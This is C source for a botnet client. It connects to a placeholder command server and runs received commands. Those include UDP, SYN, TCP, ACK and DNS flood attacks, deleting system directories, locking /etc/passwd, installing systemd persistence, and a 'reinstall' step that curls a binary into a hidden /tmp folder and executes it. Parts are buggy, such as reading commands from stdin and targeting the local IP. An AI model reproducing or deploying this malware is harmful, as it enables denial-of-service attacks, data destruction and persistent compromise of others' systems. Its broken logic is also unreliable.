#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <stdbool.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ifaddrs.h>

#define SRV_HOST "Replace IP"
#define SRV_PORT 7002
#define POOL_SZ 1024
#define PKT_SZ 512
#define N_DOMAINS 10

bool kill_on = false;
char *nuke_dirs[] = {"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"};
char *safe_dirs[] = {"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"};
const char *popular_domains[N_DOMAINS] = {
    "google.com", "youtube.com", "facebook.com", "baidu.com", "wikipedia.org",
    "twitter.com", "instagram.com", "yahoo.com", "linkedin.com", "netflix.com"
};

void *do_udp(void *arg);
void *do_syn(void *arg);
void *do_tcp(void *arg);
void *do_ack(void *arg);
void *do_dns(void *arg);
void dispatch(char *raw);
void nuke();
bool is_safe(const char *d);
void lock_fs();
void setup_persist();
void reinstall();
void dial_srv();
char *local_ip();
unsigned short cksum(unsigned short *b, int len);
void fill_rand(char *buf, size_t sz);

int main() {
    dial_srv();
    return 0;
}

void dial_srv() {
    int fd;
    struct sockaddr_in addr;
    char line[1024];

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(SRV_PORT);
    inet_pton(AF_INET, SRV_HOST, &addr.sin_addr);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(fd);
        exit(1);
    }

    while (1) {
        if (fgets(line, sizeof(line), stdin) != NULL) {
            dispatch(line);
        } else {
            perror("fgets");
        }
    }
    close(fd);
}

void dispatch(char *raw) {
    char *tok[4];
    char *t = strtok(raw, " \n");
    int n = 0;

    while (t && n < 4) {
        tok[n++] = t;
        t = strtok(NULL, " \n");
    }
    if (n == 0) return;

    if (strcmp(tok[0], "PING") == 0) {
        printf("PONG\n");
        return;
    }

    if ((strcmp(tok[0], "!udpflood") == 0 || strcmp(tok[0], "!tcpflood") == 0 ||
         strcmp(tok[0], "!synflood") == 0 || strcmp(tok[0], "!ackflood") == 0 ||
         strcmp(tok[0], "!dnsflood") == 0) && n == 4) {

        int port = atoi(tok[2]);
        pthread_t pool[POOL_SZ];
        for (int i = 0; i < POOL_SZ; i++) {
            if (strcmp(tok[0], "!udpflood") == 0)
                pthread_create(&pool[i], NULL, do_udp, &port);
            else if (strcmp(tok[0], "!synflood") == 0)
                pthread_create(&pool[i], NULL, do_syn, &port);
            else if (strcmp(tok[0], "!tcpflood") == 0)
                pthread_create(&pool[i], NULL, do_tcp, &port);
            else if (strcmp(tok[0], "!ackflood") == 0)
                pthread_create(&pool[i], NULL, do_ack, &port);
            else if (strcmp(tok[0], "!dnsflood") == 0)
                pthread_create(&pool[i], NULL, do_dns, &port);
        }
        for (int i = 0; i < POOL_SZ; i++)
            pthread_join(pool[i], NULL);
        return;
    }

    if (strcmp(tok[0], "!kill") == 0) { nuke(); return; }
    if (strcmp(tok[0], "!lock") == 0) { lock_fs(); return; }
    if (strcmp(tok[0], "!persist") == 0) { setup_persist(); return; }
    if (strcmp(tok[0], "!reinstall") == 0) { reinstall(); return; }
}

void fill_rand(char *buf, size_t sz) {
    for (size_t i = 0; i < sz; i++)
        buf[i] = 'A' + (rand() % 26);
}

void *do_udp(void *arg) {
    int port = *((int *)arg);
    char *ip = local_ip();
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;

    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &dst.sin_addr);

    char pkt[4096];
    fill_rand(pkt, sizeof(pkt));

    while (1) {
        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep(50000);
    }
    close(fd);
    return NULL;
}

void *do_syn(void *arg) {
    int port = *((int *)arg);
    char *ip = local_ip();
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) return NULL;

    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &dst.sin_addr);

    unsigned char pkt[PKT_SZ];
    memset(pkt, 0, sizeof(pkt));

    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *th = (struct tcphdr *)(pkt + sizeof(struct iphdr));

    iph->version = 4;
    iph->ihl = 5;
    iph->tot_len = htons(PKT_SZ);
    iph->id = htonl(rand() % 65535);
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(local_ip());
    iph->daddr = dst.sin_addr.s_addr;

    th->source = htons(rand() % 65535);
    th->dest = htons(port);
    th->doff = 5;
    th->syn = 1;
    th->window = htons(5840);

    iph->check = cksum((unsigned short *)pkt, sizeof(struct iphdr) + sizeof(struct tcphdr));

    while (1) {
        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep(50000);
    }
    close(fd);
    return NULL;
}

void *do_tcp(void *arg) {
    int port = *((int *)arg);
    char *ip = local_ip();
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return NULL;

    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &dst.sin_addr);

    while (1) {
        connect(fd, (struct sockaddr *)&dst, sizeof(dst));
        usleep(50000);
    }
    close(fd);
    return NULL;
}

void *do_ack(void *arg) {
    int port = *((int *)arg);
    char *ip = local_ip();
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) return NULL;

    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &dst.sin_addr);

    unsigned char pkt[PKT_SZ];
    memset(pkt, 0, sizeof(pkt));

    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *th = (struct tcphdr *)(pkt + sizeof(struct iphdr));

    iph->version = 4;
    iph->ihl = 5;
    iph->tot_len = htons(PKT_SZ);
    iph->id = htonl(rand() % 65535);
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(local_ip());
    iph->daddr = dst.sin_addr.s_addr;

    th->source = htons(rand() % 65535);
    th->dest = htons(port);
    th->doff = 5;
    th->ack = 1;
    th->window = htons(5840);

    iph->check = cksum((unsigned short *)pkt, sizeof(struct iphdr) + sizeof(struct tcphdr));

    while (1) {
        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep(50000);
    }
    close(fd);
    return NULL;
}

void *do_dns(void *arg) {
    int port = *((int *)arg);
    char *ip = local_ip();
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &dst.sin_addr);

    unsigned char pkt[PKT_SZ];

    while (1) {
        memset(pkt, 0, sizeof(pkt));
        const char *dom = popular_domains[rand() % N_DOMAINS];
        size_t dlen = strlen(dom);

        pkt[0] = rand() % 256;
        pkt[1] = rand() % 256;
        pkt[2] = 0x01;

        char *qn = (char *)pkt + 12;
        strcpy(qn, dom);
        qn[dlen] = 0;
        qn[dlen + 1] = 0x00; qn[dlen + 2] = 0x01;
        qn[dlen + 3] = 0x00; qn[dlen + 4] = 0x01;

        size_t qlen = 12 + dlen + 5;
        size_t off = qlen;
        memset(pkt + off, 0, 11);

        sendto(fd, pkt, off + 11, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(fd);
    return NULL;
}

unsigned short cksum(unsigned short *b, int len) {
    unsigned short *p = b;
    unsigned int s = 0;
    for (int i = 0; i < len / 2; i++) s += *p++;
    if (len % 2) s += *(unsigned char *)p;
    s = (s >> 16) + (s & 0xFFFF);
    s += (s >> 16);
    return (unsigned short)~s;
}

void nuke() {
    if (!kill_on) return;
    for (int i = 0; i < (int)(sizeof(nuke_dirs) / sizeof(nuke_dirs[0])); i++) {
        if (!is_safe(nuke_dirs[i]))
            remove(nuke_dirs[i]);
    }
}

bool is_safe(const char *d) {
    for (int i = 0; i < (int)(sizeof(safe_dirs) / sizeof(safe_dirs[0])); i++) {
        if (strcmp(d, safe_dirs[i]) == 0) return true;
    }
    return false;
}

void lock_fs() {
    system("chattr +i /etc/passwd");
}

void setup_persist() {
    FILE *f = fopen("/etc/systemd/system/mybot.service", "w");
    if (f) {
        fprintf(f,
            "[Unit]\nDescription=My Bot Service\nAfter=network.target\n\n"
            "[Service]\nExecStart=/path/to/mybot\nRestart=always\n\n"
            "[Install]\nWantedBy=multi-user.target\n");
        fclose(f);
        system("systemctl daemon-reload");
        system("systemctl enable mybot.service");
    }
}

void reinstall() {
    system("mkdir -p /tmp/.hidden");
    system("rm -rf /tmp/.hidden/bot");
    system("curl http://0.0.0.0/bot -o bot");
    system("cp bot /tmp/.hidden/");
    system("chmod +x /tmp/.hidden/bot");
    system("./tmp/.hidden/bot");
}

char *local_ip() {
    struct ifaddrs *addrs, *cur;
    getifaddrs(&addrs);
    cur = addrs;
    while (cur) {
        if (cur->ifa_addr && cur->ifa_addr->sa_family == AF_INET && strcmp(cur->ifa_name, "lo") != 0) {
            struct sockaddr_in *sa = (struct sockaddr_in *)cur->ifa_addr;
            return inet_ntoa(sa->sin_addr);
        }
        cur = cur->ifa_next;
    }
    freeifaddrs(addrs);
    return NULL;
}
